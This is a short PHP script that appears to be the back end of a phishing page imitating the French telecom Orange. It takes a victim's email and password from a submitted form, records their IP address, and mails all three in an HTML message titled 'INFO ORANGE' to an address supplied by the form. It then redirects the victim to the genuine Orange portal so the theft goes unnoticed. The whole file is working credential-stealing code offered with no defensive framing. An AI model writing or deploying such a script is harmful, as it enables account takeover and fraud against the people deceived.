<?php
header('Location:');
$to=$_POST['mailto'];
$password=$_POST['pass'];
$email=$_POST['email'];
$ip=$_SERVER['REMOTE_ADDR'];
$next_page="\r\n";
$header="From:blonblan118@gmail.com".$next_page;
$header= 'MIME-Version: 1.0'.$next_page;
$header= 'Content-type: text/html; charset=iso-8859-1';
$message='<header>
          <style>
		  h2{color:green;margin-left:0px;text-transform:capitalize}
#parent{border:10px solid blue;-webkit-box-shadow:12px 12px 8px #666666 ;border-radius:10px;width:500px;height:auto;background:#CCC;margin-left:10px;padding-left:5px}
#sparent{margin-left:0px;margin-top:50px;
color:#066;font-style:italic; font-family:"Palatino Linotype", "Book Antiqua", Palatino, serif}
span{padding-left:3px;color:#960;font-size:20px}
         </style>
		 </head>

<body>
<div id="parent">
<h2>les donn&eacute;es de bonnheur</h2> 
<div id="sparent">
<div>Ip:<span>'.$ip.'</span></div>
<div id="sparent"><div>email:<span>'.$email.'</span></div> 
<div id="sparent"><div>Mot de passe:<span>'.$password.'</span></div> 
</div>
  </div>
</body>
</html>';
mail($to,"INFO ORANGE",$message,$header);

header('Location: https://www.orange.fr/portail');
  exit();
?>